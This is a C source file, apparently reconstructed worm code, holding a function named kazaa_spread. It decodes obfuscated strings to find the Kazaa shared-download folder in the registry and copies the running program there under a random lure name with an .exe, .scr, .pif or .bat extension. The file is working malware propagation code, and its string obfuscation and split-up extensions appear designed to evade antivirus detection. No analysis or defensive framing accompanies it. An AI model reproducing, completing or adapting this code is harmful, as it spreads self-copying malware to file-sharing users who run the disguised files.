#include "data_globals.h"
#include <stdlib.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void kazaa_spread(LPCSTR param_1)
{
    char local_158[64];
    char local_178[32];
    HKEY local_118;
    DWORD local_114 = 256;
    BYTE local_110[256];
    int iVar4;
    int names_count;

    // "Fbsgjner\\Xnmnn\\Genafsre" XOR'd with key 0x3E
    volatile char sz_reg_key[] = {
        'F'^0x3E, 'b'^0x3E, 's'^0x3E, 'g'^0x3E, 'j'^0x3E, 'n'^0x3E, 'e'^0x3E, 'r'^0x3E,
        '\\'^0x3E, 'X'^0x3E, 'n'^0x3E, 'm'^0x3E, 'n'^0x3E, 'n'^0x3E, '\\'^0x3E, 'G'^0x3E,
        'e'^0x3E, 'n'^0x3E, 'a'^0x3E, 'f'^0x3E, 's'^0x3E, 'r'^0x3E, 'e'^0x3E, 0x00^0x3E
    };
    // "QyQve0" XOR'd with key 0x7A
    volatile char sz_val_name[] = {
        'Q'^0x7A, 'y'^0x7A, 'Q'^0x7A, 'v'^0x7A, 'e'^0x7A, '0'^0x7A, 0x00^0x7A
    };

    DWORD DVar2 = GetTickCount();
    srand(DVar2);
    names_count = KAZAA_NAMES_COUNT;

    memset(local_158, 0, sizeof(local_158));
    memset(local_178, 0, sizeof(local_178));

    xor_decrypt(sz_reg_key, sizeof(sz_reg_key), 0x3E);
    xor_decrypt(sz_val_name, sizeof(sz_val_name), 0x7A);
    _CiphStr((char *)local_158, (char*)sz_reg_key);
    _CiphStr((char *)local_178, (char*)sz_val_name);

    memset(local_110, 0, local_114);

    LSTATUS LVar3 = RegOpenKeyExA(HKEY_CURRENT_USER, (const char *)local_158, 0, KEY_QUERY_VALUE, &local_118);
    if (LVar3 != 0)
        return;

    LVar3 = RegQueryValueExA(local_118, (const char *)local_178, NULL, NULL, local_110, &local_114);
    if (LVar3 != 0)
        return;

    RegCloseKey(local_118);

    if (local_110[0] == '\0')
        return;

    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] == '/')
    {
        local_110[iVar4 - 1] = '\\';
    }

    iVar4 = strlen((char *)local_110);
    if (local_110[iVar4 - 1] != '\\')
    {
        local_110[iVar4] = '\\';
        local_110[iVar4 + 1] = '\0';
    }

    iVar4 = rand();
    strcpy((char *)(local_110 + strlen((char *)local_110)), kazaa_names[iVar4 % names_count]);
    strcat((char *)local_110, ".");

    iVar4 = rand() % 6;
    if (iVar4 == 0 || iVar4 == 1)
    {
        strcat((char *)local_110, "ex");
        strcat((char *)local_110, "e");
    }
    else if (iVar4 == 2 || iVar4 == 3)
    {
        strcat((char *)local_110, "sc");
        strcat((char *)local_110, "r");
    }
    else if (iVar4 == 4)
    {
        strcat((char *)local_110, "pi");
        strcat((char *)local_110, "f");
    }
    else
    {
        strcat((char *)local_110, "ba");
        strcat((char *)local_110, "t");
    }

    CopyFileA(param_1, (LPCSTR)local_110, TRUE);
    return;
}
#pragma optimize("", on)
